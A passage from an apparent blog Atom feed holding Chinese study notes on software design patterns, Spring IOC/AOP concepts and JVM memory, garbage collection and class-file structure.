缺点：</p><ol><li>状态模式的使用必然会增加系统类和对象的个数。</li><li>状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。</li><li>状态模式对&quot;开闭原则&quot;的支持并不太好，对于可以切换状态的状态模式，增加新的状态类需要修改那些负责状态转换的源代码，否则无法切换到新增状态，而且修改某个状态类的行为也需修改对应类的源代码。</li></ol><p>  使用场景：</p><ol><li>行为随状态改变而改变的场景。</li><li>条件、分支语句的代替者。</li></ol><p>  注意事项：在行为受状态约束的时候使用状态模式，而且状态不超过 5 个。</p><h3 id="实现-20"><a class="markdownIt-Anchor" href="#实现-20"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/state_pattern_uml_diagram.png" alt="" /></p><h2 id="9空对象模式null-object-pattern"><a class="markdownIt-Anchor" href="#9空对象模式null-object-pattern"></a> 9.空对象模式（Null Object Pattern）</h2><h3 id="介绍-22"><a class="markdownIt-Anchor" href="#介绍-22"></a> 介绍</h3><p>  在空对象模式（Null Object Pattern）中，一个空对象取代 NULL 对象实例的检查。Null 对象不是检查空值，而是反应一个不做任何动作的关系。这样的 Null 对象也可以在数据不可用的时候提供默认的行为。</p><p>  在空对象模式中，我们创建一个指定各种要执行的操作的抽象类和扩展该类的实体类，还创建一个未对该类做任何实现的空对象类，该空对象类将无缝地使用在需要检查空值的地方。</p><h3 id="实现-21"><a class="markdownIt-Anchor" href="#实现-21"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/null_pattern_uml_diagram.jpg" alt="" /></p><h2 id="10策略模式strategy-pattern"><a class="markdownIt-Anchor" href="#10策略模式strategy-pattern"></a> 10.策略模式（Strategy Pattern）</h2><p>###介绍<br />  意图：定义一系列的算法,把它们一个个封装起来, 并且使它们可相互替换。</p><p>  主要解决：在有多种算法相似的情况下，使用 if…else 所带来的复杂和难以维护。</p><p>  何时使用：一个系统有许多许多类，而区分它们的只是他们直接的行为。</p><p>  如何解决：将这些算法封装成一个一个的类，任意地替换。</p><p>  关键代码：实现同一个接口。</p><p>  应用实例：</p><ol><li>诸葛亮的锦囊妙计，每一个锦囊就是一个策略。</li><li>旅行的出游方式，选择骑自行车、坐汽车，每一种旅行方式都是一个策略。</li><li>JAVA AWT 中的 LayoutManager。</li></ol><p>  优点：</p><ol><li>算法可以自由切换。</li><li>避免使用多重条件判断。</li><li>扩展性良好。</li></ol><p>  缺点：</p><ol><li>策略类会增多。</li><li>所有策略类都需要对外暴露。</li></ol><p>  使用场景：</p><ol><li>如果在一个系统里面有许多类，它们之间的区别仅在于它们的行为，那么使用策略模式可以动态地让一个对象在许多行为中选择一种行为。</li><li>一个系统需要动态地在几种算法中选择一种。</li><li>如果一个对象有很多的行为，如果不用恰当的模式，这些行为就只好使用多重的条件选择语句来实现。</li></ol><p>  注意事项：如果一个系统的策略多于四个，就需要考虑使用混合模式，解决策略类膨胀的问题。</p><h3 id="实现-22"><a class="markdownIt-Anchor" href="#实现-22"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/strategy_pattern_uml_diagram.jpg" alt="" /></p><h2 id="11模板模式template-pattern"><a class="markdownIt-Anchor" href="#11模板模式template-pattern"></a> 11.模板模式（Template Pattern）</h2><p>###介绍<br />  意图：定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。</p><p>  主要解决：一些方法通用，却在每一个子类都重新写了这一方法。</p><p>  何时使用：有一些通用的方法。</p><p>  如何解决：将这些通用算法抽象出来。</p><p>  关键代码：在抽象类实现，其他步骤在子类实现。</p><p>  应用实例：</p><ol><li>在造房子的时候，地基、走线、水管都一样，只有在建筑的后期才有加壁橱加栅栏等差异。</li><li>西游记里面菩萨定好的 81 难，这就是一个顶层的逻辑骨架。</li><li>spring 中对 Hibernate 的支持，将一些已经定好的方法封装起来，比如开启事务、获取 Session、关闭 Session 等，程序员不重复写那些已经规范好的代码，直接丢一个实体就可以保存。</li></ol><p>  优点：</p><ol><li>封装不变部分，扩展可变部分。</li><li>提取公共代码，便于维护。</li><li>行为由父类控制，子类实现。</li></ol><p>  缺点：每一个不同的实现都需要一个子类来实现，导致类的个数增加，使得系统更加庞大。</p><p>  使用场景：</p><ol><li>有多个子类共有的方法，且逻辑相同。</li><li>重要的、复杂的方法，可以考虑作为模板方法。</li></ol><p>  注意事项：为防止恶意操作，一般模板方法都加上 final 关键词。</p><h2 id="12访问者模式visitor-pattern"><a class="markdownIt-Anchor" href="#12访问者模式visitor-pattern"></a> 12.访问者模式（Visitor Pattern）</h2><h3 id="介绍-23"><a class="markdownIt-Anchor" href="#介绍-23"></a> 介绍</h3><p>  意图：主要将数据结构与数据操作分离。</p><p>  主要解决：稳定的数据结构和易变的操作耦合问题。</p><p>  何时使用：需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作&quot;污染&quot;这些对象的类，使用访问者模式将这些封装到类中。</p><p>  如何解决：在被访问的类里面加一个对外提供接待访问者的接口。</p><p>  关键代码：在数据基础类里面有一个方法接受访问者，将自身引用传入访问者。</p><p>  应用实例：您在朋友家做客，您是访问者，朋友接受您的访问，您通过朋友的描述，然后对朋友的描述做出一个判断，这就是访问者模式。</p><p>  优点：</p><ol><li>符合单一职责原则。</li><li>优秀的扩展性。</li><li>灵活性。</li></ol><p>  缺点：</p><ol><li>具体元素对访问者公布细节，违反了迪米特原则。</li><li>具体元素变更比较困难。</li><li>违反了依赖倒置原则，依赖了具体类，没有依赖抽象。</li></ol><p>  使用场景：</p><ol><li>对象结构中对象对应的类很少改变，但经常需要在此对象结构上定义新的操作。</li><li>需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作&quot;污染&quot;这些对象的类，也不希望在增加新操作时修改这些类。</li></ol><p>  注意事项：访问者可以对功能进行统一，可以做报表、UI、拦截器与过滤器。</p><h3 id="实现-23"><a class="markdownIt-Anchor" href="#实现-23"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/visitor_pattern_uml_diagram.jpg" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  From 《设计模式》(&lt;a href=&quot;http://RUNOOB.com&quot;&gt;RUNOOB.com&lt;/a&gt;)&lt;/p&gt;
&lt;h1 id=&quot;一-创建型&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-创建型&quot;&gt;&lt;/a&gt; 一、创建型&lt;/h1&gt;
&lt;</summary>
      
    
    
    
    <category term="读书笔记" scheme="https://coder.lufer.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="读书笔记" scheme="https://coder.lufer.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Spring部分概念要点总结</title>
    <link href="https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Spring%E9%83%A8%E5%88%86%E6%A6%82%E5%BF%B5%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Spring%E9%83%A8%E5%88%86%E6%A6%82%E5%BF%B5%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2019-08-09T06:09:22.000Z</published>
    <updated>2021-12-17T03:59:35.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-iocinversion-of-control"><a class="markdownIt-Anchor" href="#一-iocinversion-of-control"></a> 一、IOC(Inversion of Control)</h1><h2 id="1概念"><a class="markdownIt-Anchor" href="#1概念"></a> 1.概念</h2><p>  IOC即控制反转，将设计好的对象交给容器控制，而不是在对象内部控制。<br />  借助IOC容器，可以使各对象之间解耦。</p><h2 id="2实现方式"><a class="markdownIt-Anchor" href="#2实现方式"></a> 2.实现方式</h2><p>  也叫做依赖注入(DI)，共有三种方式：</p><ol><li>接口注入</li><li>Construct注入</li><li>Setter注入</li></ol><h2 id="3实现方法"><a class="markdownIt-Anchor" href="#3实现方法"></a> 3.实现方法</h2><p>  其核心是在系统运行中，由IOC容器动态的向某个对象提供所需对象。实现依赖注入的方式是反射，其具体方法是：</p><ol><li>定义用来描述Bean配置的Java类</li><li>解析Bean配置，Spring采用HashMap来存储BeanDefination对象</li><li>遍历取出配置信息，通过反射实例化对象，保存在另一个Map中</li></ol><h2 id="4ioc的优势"><a class="markdownIt-Anchor" href="#4ioc的优势"></a> 4.IOC的优势</h2><ol><li>降低类之间的耦合</li><li>倡导面向接口编程</li><li>提高系统可插入，可测试，可修改的特性</li></ol><h1 id="二-aopaspect-oriented-programming"><a class="markdownIt-Anchor" href="#二-aopaspect-oriented-programming"></a> 二、AOP(Aspect Oriented Programming)</h1><p>  AOP即面向切面编程，在程序某处切开，注入定义的接口(将一些公用行为封装成接口模块)。</p><h2 id="1原理"><a class="markdownIt-Anchor" href="#1原理"></a> 1.原理</h2><h3 id="1静态代理"><a class="markdownIt-Anchor" href="#1静态代理"></a> 1.静态代理</h3><p>  若代理类在程序运行前就已经存在，那么这种代理方式被成为静态代理，这种情况下的代理类通常都是我们在Java代码中定义的。</p><h3 id="2动态代理"><a class="markdownIt-Anchor" href="#2动态代理"></a> 2.动态代理</h3><p>  代理类在程序运行时创建的代理方式被成为动态代理。也就是说，这种情况下，代理类并不是在Java代码中定义的，而是在运行时根据我们在Java代码中的“指示”动态生成的。</p><ol><li>JDK动态代理：通过反射接收被代理的类，被代理的类必须实现一个借口</li><li>CGLIB动态代理：若没有实现接口，SpringAOP会用CGLIB动态生成子类</li></ol><h2 id="2应用场景"><a class="markdownIt-Anchor" href="#2应用场景"></a> 2.应用场景</h2><p>  权限、缓存、内容传递、错误处理、懒加载、调试、跟踪、优化、同步、事务</p><h2 id="3切点"><a class="markdownIt-Anchor" href="#3切点"></a> 3.切点</h2><h3 id="1连接点"><a class="markdownIt-Anchor" href="#1连接点"></a> 1.连接点</h3><p>  程序执行的某个特定位置，Spring仅支持方法连接点，如方法的调用前、调用后。</p><h3 id="2切点"><a class="markdownIt-Anchor" href="#2切点"></a> 2.切点</h3><p>  查询条件，根据切点查找对应的连接点，一个切点可以匹配多个连接点。</p><h3 id="3增强"><a class="markdownIt-Anchor" href="#3增强"></a> 3.增强</h3><p>  织入到目标类连接点上的一段程序代码。</p><h3 id="4引介"><a class="markdownIt-Anchor" href="#4引介"></a> 4.引介</h3><p>  可以为类添加一些属性和方法，即使一个类原来没有实现某些功能，通过引介可以动态的添加接口的逻辑，使其成为接口的实现类。<br />  可以在编译器/运行时/装载期织入。</p><h3 id="5切面"><a class="markdownIt-Anchor" href="#5切面"></a> 5.切面</h3><p>  由切点和增强组成。</p><h1 id="三-spring模块结构"><a class="markdownIt-Anchor" href="#三-spring模块结构"></a> 三、 Spring模块结构</h1><p><img src="https://pic.lufer.cc/images/2021/03/15/eb8pTI.png" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-iocinversion-of-control&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-iocinversion-of-control&quot;&gt;&lt;/a&gt; 一、IOC(Inversion of Control)&lt;/h1&gt;
&lt;h2 </summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
    <category term="Spring" scheme="https://coder.lufer.cc/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>《深入理解JVM》部分要点总结</title>
    <link href="https://coder.lufer.cc/Java/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E3%80%8B%E9%83%A8%E5%88%86%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://coder.lufer.cc/Java/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E3%80%8B%E9%83%A8%E5%88%86%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2019-08-08T11:56:38.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二章-java内存区域与内存溢出异常"><a class="markdownIt-Anchor" href="#第二章-java内存区域与内存溢出异常"></a> 第二章  Java内存区域与内存溢出异常</h1><h2 id="一-运行时数据区域"><a class="markdownIt-Anchor" href="#一-运行时数据区域"></a> 一、运行时数据区域</h2><p><img src="https://pic.lufer.cc/images/2021/03/15/e7J4lF.png" alt="" /></p><h3 id="1方法区non-heap永久代"><a class="markdownIt-Anchor" href="#1方法区non-heap永久代"></a> 1.方法区(Non-Heap/永久代)</h3><p>  方法区是个线程共享的内存区域，主要存储：已被JVM加载的类信息，常量，静态变量，即使编译器编译后的代码。<br />  不需要连续的内存，可以选择固定大小或可扩展的大小，此外还可以选择不实现GC。<br />  该区域的GC目标主要是对常量池的回收和对类型的卸载。<br />  当方法区无法满足内存分配需求时，会抛出OutOfMemoryError异常。</p><h3 id="2虚拟机栈"><a class="markdownIt-Anchor" href="#2虚拟机栈"></a> 2.虚拟机栈</h3><p>  虚拟机栈是线程私有的，主要执行Java方法，描述了Java方法执行的内存模型。<br />  每个方法在执行时都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接、方法出口等。一个方法从调用至执行完成的过程，就对应着一个栈帧在VM Stack中从入栈到出栈的过程。</p><p>  局部变量表：存放了编译器可知的基本数据类型、对象引用、returnAddress。该表所需的内存空间在编译器就会完成分配，运行期间不会改变大小。</p><p>  当线程请求的栈深度超出了JVM允许的深度，会抛出StackOverflowError异常，当扩展时无法申请到足够的内存时，会抛出OutOfMemoryError异常。</p><h3 id="3本地方法栈"><a class="markdownIt-Anchor" href="#3本地方法栈"></a> 3.本地方法栈</h3><p>  本地方法栈也是线程私有的，主要执行虚拟机用的Native方法。<br />  在HotSpot中，本地方法栈与虚拟机栈合二为一。</p><h3 id="4堆"><a class="markdownIt-Anchor" href="#4堆"></a> 4.堆</h3><p>  堆是所有线程共享的，是JVM所管理的内存中最大的一块，几乎所有的数组/对象实例都在这里分配内存。</p><p>  Java堆可以细分为新生代和老年代，再细分可以分为Eden、From Survivor、To Survivor空间。</p><p>  Java堆在物理上可以是不连续的，但在逻辑上是连续的，当内存不足以完成实例分配且无法扩展时，会抛出OutOfMemoryError异常。</p><h3 id="5程序计数器"><a class="markdownIt-Anchor" href="#5程序计数器"></a> 5.程序计数器</h3><p>  程序计数器是线程私有的，是一块较小的内存空间，可看作是当前线程所执行的字节码的行号指示器。每个线程都有一个独立的程序计数器，各计数器互不影响。</p><ol><li>执行Java方法：计数器记录正在执行的虚拟机字节码指令地址</li><li>执行Native方法：计数器值为空</li></ol><h3 id="6直接内存"><a class="markdownIt-Anchor" href="#6直接内存"></a> 6.直接内存</h3><p>  NIO提供了一种基于通道和缓冲区的I/O方式，可以使用Native函数库直接分配堆外内存，然后通过一个存在堆中的DirectByteBuffer对象作为这块内存的引用。<br />这种方法可以避免在Java堆和Native堆中来回复制从而提高性能。</p><h2 id="二-创建对象"><a class="markdownIt-Anchor" href="#二-创建对象"></a> 二、创建对象</h2><p>  在遇到New指令后执行如下步骤：</p><h3 id="1检查"><a class="markdownIt-Anchor" href="#1检查"></a> 1.检查</h3><p>  检查能否在常量池定位类的符号引用，并检查这个类是否被加载解析、初始化，如果没有，则先加载类，加载完成后执行第二步。</p><h3 id="2分配内存"><a class="markdownIt-Anchor" href="#2分配内存"></a> 2.分配内存</h3><p>  对象所需的内存大小在类加载完成时即确定，内存分配主要有两种方式：</p><ol><li>指针碰撞：Java堆中的内存绝对规整，用过的在一边，空闲的在另一边，中间有一个作为分界点指示器的指针，分配内存只需将该指针移动一段距离。</li><li>空闲列表：堆中的内存不规整，已用内存与空闲内存互相交错。此时VM维护一个列表，记录哪些内存块可用，并找一块足够大的用于分配。</li></ol><p>  选择哪种方式来进行内存分配取决于堆是否规整，而堆是否规整取决于GC是否带有压缩整理功能。</p><p>  内存分配在并发的情况下不是线程安全的，有两种解决方式：</p><ol><li>内存分配操作同步处理(慢分配)<br />将所有内存分配操作全部同步处理，VM采用CAS(Compare And Swap)+失败重试来保证更新操作的原子性。</li><li>本地线程分配缓冲(快分配/TLAB)</li></ol><p>  为每个线程在Java堆中预先分配一小块内存，在需要分配时每个线程在自己的TLAB上进行分配，只有在TLAB用完并需要分配新TLAB时才需要同步锁定。</p><h3 id="3内存空间初始化"><a class="markdownIt-Anchor" href="#3内存空间初始化"></a> 3.内存空间初始化</h3><p>  将分配到的内存空间都初始化为二进制的零值，保证对象不赋初值也可以直接使用。</p><h3 id="4对对象进行必要设置"><a class="markdownIt-Anchor" href="#4对对象进行必要设置"></a> 4.对对象进行必要设置</h3><p>  主要包括：该对象是哪个类的实例，如何找到类的元数据，对象的Hash值，对象的GC代。这些信息保存在对象头中。</p><h2 id="三-对象的内存布局"><a class="markdownIt-Anchor" href="#三-对象的内存布局"></a> 三、对象的内存布局</h2><h3 id="1内存头"><a class="markdownIt-Anchor" href="#1内存头"></a> 1.内存头</h3><p>  包括：</p><ol><li>用于存储对象自身运行时的数据(HashCode/GC代年龄/锁标志)，数据结构不固定。</li><li>类型指针，指向类元数据，用于确定该对象属于哪个类。</li><li>若对象为数组，对象头还记录数据长度。</li></ol><h3 id="2示例数据"><a class="markdownIt-Anchor" href="#2示例数据"></a> 2.示例数据</h3><p>  存储数据中定义的各类字段，分配策略：long/double-&gt;int-&gt;short/char-&gt;byte/boolean-&gt;OrdinaryObjectPointer<br />  相同大小的字段总是被分配到一起，在满足这个条件的前提下，父类中定义的变量会出现在子类之前。</p><h3 id="3对齐填充非必须"><a class="markdownIt-Anchor" href="#3对齐填充非必须"></a> 3.对齐填充(非必须)</h3><p>  HotSpot VM要求对象起始地址是8字节的整数倍，大小也是8字节的整数倍。如果对象实例数据没有对齐，则需要对齐填充补全。</p><h2 id="四-对象访问定位"><a class="markdownIt-Anchor" href="#四-对象访问定位"></a> 四、对象访问定位</h2><p>  对象的访问定位，即如何从Reference找到具体对象，有两种方式：</p><ol><li>句柄：堆中划分一块内存作为句柄池，Reference存的是对象的句柄地址，句柄中保存对象实例数据与类型数据各自的具体信息。</li><li>直接指针：Reference中保存的是对象实例数据的地址，实例数据中存仓指向类型数据的指针。</li></ol><p>  优劣比较：</p><ol><li>句柄方式在对象呗移动时只需改变句柄保存的内容，无需改变Reference，比较稳定。</li><li>直接指针节省了一次指针定位的开销，速度较快(HotSpot采用该方式实现)</li></ol><h1 id="第三章-垃圾收集器与内存分配策略"><a class="markdownIt-Anchor" href="#第三章-垃圾收集器与内存分配策略"></a> 第三章  垃圾收集器与内存分配策略</h1><h2 id="一-对象已死吗"><a class="markdownIt-Anchor" href="#一-对象已死吗"></a> 一、对象已死吗</h2><h3 id="1对象存活状态判定"><a class="markdownIt-Anchor" href="#1对象存活状态判定"></a> 1.对象存活状态判定</h3><p>  对于对象的存活状态，主要有两种方法进行判断：</p><ol><li>引用计数：给对象添加引用计数器，有引用+1，引用失效-1，为0则不可再用，但这种方法不能解决循环引用的问题。</li><li>可达性分析(Java采用这种方法)：从GC Roots为起点出发，向下搜索，所走的路径叫做引用链，被引用链连起来的是可用的，不可达的是不可用的。</li></ol><h3 id="2对象的引用强度"><a class="markdownIt-Anchor" href="#2对象的引用强度"></a> 2.对象的引用强度</h3><ol><li>强引用:代码中普遍存在，只要强引用还在，对象就不会被回收</li><li>软引用:还有用但是非必需的对象，在内存溢出之前会被回收</li><li>弱引用:该类对象只能生存到下一次GC前，在GC时会被回收</li><li>虚引用:该引用不会影响对象的生存时间，也不能用来获得对象实例。虚引用的意义是在对象被GC时收到通知。</li></ol><h3 id="2finalize"><a class="markdownIt-Anchor" href="#2finalize"></a> 2.Finalize</h3><p>  对于不可达的对象，会进行两次标记。</p><ol><li>对象没有覆盖finalize或已经吊用过finalze–&gt;回收</li><li>将对象移入F-Queue,执行Finalize方法(但是不保证会等待方法结束),在finalize中仍然没有建立对对象的引用–&gt;回收</li><li>finalize中建立了对对象的引用，移出GC列表</li></ol><h3 id="3回收永久代"><a class="markdownIt-Anchor" href="#3回收永久代"></a> 3.回收永久代</h3><p>  永久代主要回收：无引用的废弃常量，要被卸载的无用类</p><p>  无用类的判断规则(需同时满足)：</p><ol><li>该类所有实例都已回收</li><li>加载该类的ClassLoader已被回收</li><li>该类对应的java.lang.class对象没有任何地方被引用，无法通过反射访问类</li></ol><p>  意义：大量使用反射，动态代理，CGLib等频繁自定义ClassLoader的情况下防止永久代溢出。</p><h2 id="二-垃圾收集算法"><a class="markdownIt-Anchor" href="#二-垃圾收集算法"></a> 二、垃圾收集算法</h2><h3 id="1标记-清除mark-sweep"><a class="markdownIt-Anchor" href="#1标记-清除mark-sweep"></a> 1.标记-清除(Mark-Sweep)</h3><p>  先用判定方法标记对象的存活状态，然后进行回收。<br />  缺点:</p><ol><li>效率低</li><li>回收后空间碎片多</li></ol><h3 id="2复制copying"><a class="markdownIt-Anchor" href="#2复制copying"></a> 2.复制(Copying)</h3><p>  将内存划分为大小相等的两块，每次仅用一块，当需要GC时，将其中存活的对象复制到另一块，回收前一块。</p><p>  优点:只需移动堆顶指针，按顺序分配内存，实现简单，效率高。<br />  缺点:可用内存减半，代价较高。<br />  改进:将内存分为一个较大的Eden和两个较小的Survivor(HotSpot中比例为8:1:1),使用时占用一个Eden和一个Survivor，GC时复制到另一个Survivor，当空间不足时，要进行分配担保。</p><h3 id="3标记-整理mark-compact"><a class="markdownIt-Anchor" href="#3标记-整理mark-compact"></a> 3.标记-整理(Mark-Compact)</h3><p>  先标记，然后将存活的对象向一端移动，在清理边界以外的内存。</p><h3 id="4分代收集"><a class="markdownIt-Anchor" href="#4分代收集"></a> 4.分代收集</h3><p>  对于新生代，采用“复制”的方法。<br />  对于老年代，采用“标记-清理”或者“标记-整理”的方法。</p><h2 id="三-g1收集器"><a class="markdownIt-Anchor" href="#三-g1收集器"></a> 三、G1收集器</h2><p>  G1收集器是HotSpot采用的收集器</p><h3 id="1特点"><a class="markdownIt-Anchor" href="#1特点"></a> 1.特点</h3><ol><li>并行与并发:并行处理，缩短Stop-The-World的时间。并发处理，在查找Root的时候Java程序可以继续执行。</li><li>分代收集</li><li>空间整合:整体上看是基于“标记-整理”，局部上看是基于“复制”，不产生空间碎片。</li><li>可预测的停顿:可指定在M毫秒的时间段内，可用于GC的时间不得超过N毫秒。</li></ol><h3 id="2内存管理"><a class="markdownIt-Anchor" href="#2内存管理"></a> 2.内存管理</h3><p>  将内存堆划分为多个大小相等的Region，追踪各个Region里垃圾价值大小。维护一个优先列表，每次根据允许的时间回收价值最大的Region。</p><h3 id="3g1工作步骤"><a class="markdownIt-Anchor" href="#3g1工作步骤"></a> 3.G1工作步骤</h3><ol><li>初始标记:标记GC Roots能直接关联的对象。这步需要停顿线程，但耗时短。</li><li>并发标记:进行可达性分析，寻找存活的对象。</li><li>最终标记:修正并发标记时由于并发操作而产生变化的部分，需要停顿线程，但可以并发执行。</li><li>筛选回收:对各Region回收价值与成本进行排序，根据期望时间指定回收计划。</li></ol><h2 id="四-内存分配与回收策略"><a class="markdownIt-Anchor" href="#四-内存分配与回收策略"></a> 四、内存分配与回收策略</h2><h3 id="1对象优先在eden分配"><a class="markdownIt-Anchor" href="#1对象优先在eden分配"></a> 1.对象优先在Eden分配</h3><p>  大多数情况下，对象在新生代Eden区中进行分配，当Eden区没有足够的空间时，将会出发一次Minor GC。</p><h3 id="2大对象直接进入老年代"><a class="markdownIt-Anchor" href="#2大对象直接进入老年代"></a> 2.大对象直接进入老年代</h3><p>  对于需要大量连续内存空间的Java对象，直接在老年代中分配内存。</p><h3 id="3长期存活的对象进入老年代"><a class="markdownIt-Anchor" href="#3长期存活的对象进入老年代"></a> 3.长期存活的对象进入老年代</h3><p>  对象每活过一次GC，年龄就会+1，当年龄增加到一定程度(可在VM参数中设置)后，就会进入老年代。</p><h3 id="4动态对象年龄判定"><a class="markdownIt-Anchor" href="#4动态对象年龄判定"></a> 4.动态对象年龄判定</h3><p>  如果Survivor中相同年龄的所有对象大小的综合大于Survivor空间的一半，年龄大于或等于该年龄的对象就可以直接进入老年代。</p><h3 id="5空间分配担保"><a class="markdownIt-Anchor" href="#5空间分配担保"></a> 5.空间分配担保</h3><p><img src="https://pic.lufer.cc/images/2021/03/15/e7RzjJ.png" alt="" /></p><p>  JDK 6以后，在老年代连续空间大于新生代对象总大小或者历次晋升平均大小时进行MinorGC，否则进行FullGC</p><h1 id="第五章-vm调优"><a class="markdownIt-Anchor" href="#第五章-vm调优"></a> 第五章  VM调优</h1><h2 id="一-高性能硬件部署策略"><a class="markdownIt-Anchor" href="#一-高性能硬件部署策略"></a> 一、高性能硬件部署策略</h2><h3 id="1通过64位jdk使用大内存"><a class="markdownIt-Anchor" href="#1通过64位jdk使用大内存"></a> 1.通过64位JDK使用大内存</h3><p>  缺点:</p><ol><li>内存回收导致长时间停顿</li><li>64位JDK性能较低</li><li>需要保证程序足够稳定，因为如果溢出无法转储，也不能分析</li><li>64位内存消耗比32位的大</li></ol><h3 id="2用若干32位虚拟机建立逻辑集群"><a class="markdownIt-Anchor" href="#2用若干32位虚拟机建立逻辑集群"></a> 2.用若干32位虚拟机建立逻辑集群</h3><p>  缺点:</p><ol><li>需要避免竞争全局资源</li><li>很难高效利用某些资源池</li><li>受32位限制，Windows堆只能开1.5GB,Linux只能开4GB</li><li>每个逻辑节点上都有缓存，造成内存浪费。</li></ol><h3 id="3jvm运行中可能存在的若干问题"><a class="markdownIt-Anchor" href="#3jvm运行中可能存在的若干问题"></a> 3.JVM运行中可能存在的若干问题</h3><ol><li>集群间频繁同步导致内存溢出</li><li>堆外内存溢出</li><li>调用外部命令导致系统缓慢</li><li>JVM崩溃</li><li>不恰当的数据结构导致内存占用过大</li><li>由于Windows虚拟内存导致交换到页面文件中从而导致长时间停顿</li></ol><h2 id="二-常用优化方法"><a class="markdownIt-Anchor" href="#二-常用优化方法"></a> 二、常用优化方法</h2><ol><li>升级VM版本</li><li>-Xverify:none 禁用字节码验证</li><li>调整内存设置，设定恰当的新生代容量，减少GC频率</li><li>指定GC收集器</li></ol><h1 id="第六章-类文件结构"><a class="markdownIt-Anchor" href="#第六章-类文件结构"></a> 第六章  类文件结构</h1><h2 id="一-class类文件结构"><a class="markdownIt-Anchor" href="#一-class类文件结构"></a> 一、Class类文件结构</h2><h3 id="1前4字节"><a class="markdownIt-Anchor" href="#1前4字节"></a> 1.前4字节</h3><p>  魔数，用于确定这个文件是否是一个能够被VM接受的class文件，class文件的前四字节为0xCAFEBABE</p><h3 id="25-8字节"><a class="markdownIt-Anchor" href="#25-8字节"></a> 2.5-8字节</h3><p>  第5和第6字节为版本号，第7和第8字节为主版本号。<br />  高版本JDK只能运行以前的class文件，不能运行更高版本的class文件。</p><h3 id="3常量池"><a class="markdownIt-Anchor" href="#3常量池"></a> 3.常量池</h3><p>  主要存放两大类常量：字面量，符号引用(类和接口的全限定名/字段的名称和描述符/方法的名称和描述符)。<br />  入口有一个u2类型的变量，表示池中常量的数量，随后根据常量类型标志+常量内容位来表示常量。</p><h3 id="4访问标志"><a class="markdownIt-Anchor" href="#4访问标志"></a> 4.访问标志</h3><p>  用两字节表示访问标志，用于标识一些类或接口层次的访问信息。</p><h3 id="5类索引父类索引与接口索引集合"><a class="markdownIt-Anchor" href="#5类索引父类索引与接口索引集合"></a> 5.类索引，父类索引与接口索引集合</h3><h3 id="6字段表集合"><a class="markdownIt-Anchor" href="#6字段表集合"></a> 6.字段表集合</h3><p>  用于描述接口或勒种生命的变量，包括类级变量和实例级变量，但不包括方法内部的局部变量。<br />  其中两字节用来描述字段访问性，两字节用来表示名称(常量池索引),两字节用来表示描述符(常量池索引)。</p><h3 id="7方法表集合"><a class="markdownIt-Anchor" href="#7方法表集合"></a> 7.方法表集合</h3><h3 id="8属性表集合"><a class="markdownIt-Anchor" href="#8属性表集合"></a> 8.属性表集合</h3><p>  部分属性:</p><ol><li>Code:以字节码形式存在的Java方法体代码</li><li>Exceptions:列举方法中throw出的异常类型</li><li>LineNumberTable:描述源码行号与字节码行号之间的对应关系</li><li>LocalVariableTable:描述栈帧中局部变量表中的变量与源码中定义的变量之间的关系</li><li>SourceFile:记录生成这个Class文件的源文件名</li><li>ConstantValue:通知VM为静态变量赋值</li><li>InnerClass:记录内部类与宿主类间的关联</li><li>Signature:泛型类型，使反射API可以获取泛型类型。</li></ol><h2 id="二-字节码"><a class="markdownIt-Anchor" href="#二-字节码"></a> 二、字节码</h2><h3 id="1加载与存储"><a class="markdownIt-Anchor" href="#1加载与存储"></a> 1.加载与存储</h3><p>  加载:load<br />  存储:store<br />  常量加载到操作数栈:push<br />  扩充局部变量表的访问索引:wide</p><h3 id="2运算"><a class="markdownIt-Anchor" href="#2运算"></a> 2.运算</h3><p>  加减乘除:add/sub/mul/div<br />  取模:rem<br />  位移:shl/shr<br />  取反:neg<br />  按位或:or<br />  按位与:and<br />  按位异或:xor<br />  自增:inc<br />  比较:cmpg,cmpl</p><h3 id="3类型转换"><a class="markdownIt-Anchor" href="#3类型转换"></a> 3.类型转换</h3><p>i2b/i2c/i2s/l2i/f2i…</p><h3 id="4对象"><a class="markdownIt-Anchor" href="#4对象"></a> 4.对象</h3><p>  对象创建:new<br />  数组创建:newarray、anewarray、multianewarray<br />  访问类实例:getfield、putfield、getstatic、putstatic<br />  数组压栈:aload<br />  将栈值存到数组:astore<br />  取数组长度:arraylength<br />  检查实例类型:instanceof、checkcast</p><h3 id="5操作数栈管理"><a class="markdownIt-Anchor" 